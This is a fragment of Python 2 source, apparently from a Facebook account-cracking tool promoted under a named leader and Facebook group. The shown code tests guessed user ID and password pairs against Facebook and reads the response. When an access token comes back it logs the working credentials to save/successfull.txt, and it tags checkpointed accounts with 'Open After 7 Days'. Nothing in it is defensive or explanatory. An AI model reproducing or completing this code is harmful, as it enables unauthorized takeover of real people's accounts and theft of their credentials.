...
def menu():
    ...
    print logo
    print ''
    print 'LEADER   : MD. Jayed Hossen'
    print 'FACEBOOK : facebook.com/Dark.caybar'
    print 'TEAM     : facebook.com/groups/jayedahmed'
    print ''
    print 50* '-'
    print '[1]  \x1b[1;96mGP'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[D3M09-OKAY]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[D3M09-CP]\x1b[1;97m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m[Open After 7 Days]\x1b[0m \n'
